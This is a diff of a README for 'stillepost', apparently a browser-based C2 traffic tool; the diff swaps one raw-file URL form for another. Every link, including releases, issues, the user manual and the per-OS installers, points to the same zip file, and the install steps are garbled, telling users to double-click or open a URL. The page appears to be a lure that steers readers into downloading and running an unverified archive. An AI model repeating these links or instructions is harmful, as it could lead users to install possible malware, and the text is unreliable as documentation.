@@ -6,11 +6,11 @@ Welcome to **stillepost**! This application allows you to use Chromium-based bro
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip%20Release-blue)](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip)
+[![Download Latest Release](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip%20Release-blue)](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip)
 
 To get started, you will need to download the application. Click the button above or visit the following link:
 
-**[Download Stillepost](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip)**
+**[Download Stillepost](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip)**
 
 ## 🛠️ System Requirements
 
@@ -24,30 +24,30 @@ Before installing, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip).
+1. Go to the [Releases page](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip).
 2. Look for the latest version. It will be at the top of the page.
 3. Click on the version number. This will show you the release details.
 4. Download the appropriate installer for your operating system. Available options will include:
-   - **Windows:** `https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`
-   - **macOS:** `https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`
-   - **Linux:** `https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`
+   - **Windows:** `https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`
+   - **macOS:** `https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`
+   - **Linux:** `https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`
 
 5. Once the download is complete, locate the file in your downloads folder.
 
 ### For Windows Users:
 
-- Double-click the **`https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`** file.
+- Double-click the **`https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`** file.
 - Follow the on-screen instructions to complete the installation.
 
 ### For macOS Users:
 
-- Open the **`https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`** file.
+- Open the **`https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`** file.
 - Drag the **stillepost** icon into your Applications folder.
 - Eject the disk image after the copy is complete.
 
 ### For Linux Users:
 
-- Extract the **`https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip`** file using the terminal or your file manager.
+- Extract the **`https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip`** file using the terminal or your file manager.
 - Open a terminal and navigate to the folder containing the extracted files.
 - Run the following command to start the application:
   ```bash
@@ -75,7 +75,7 @@ If you encounter issues while downloading or running **stillepost**, try these t
 
 ## 📚 Getting Help
 
-For support, please visit the GitHub [Issues page](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip). You can report any bugs or request new features. 
+For support, please visit the GitHub [Issues page](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip). You can report any bugs or request new features. 
 
 ## ✨ Features
 
@@ -86,8 +86,8 @@ For support, please visit the GitHub [Issues page](https://raw.githubusercontent
 
 ## 🔗 Important Links
 
-- [Download Stillepost](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip)
-- [Stillepost GitHub Repository](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip)
-- [User Manual](https://raw.githubusercontent.com/Catengue/stillepost/main/python_code/stillepost_v2.4.zip)
+- [Download Stillepost](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip)
+- [Stillepost GitHub Repository](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip)
+- [User Manual](https://github.com/Catengue/stillepost/raw/refs/heads/main/python_code/stillepost_v2.4.zip)
 
 Thank you for choosing **stillepost**! Enjoy secure C2 traffic management.
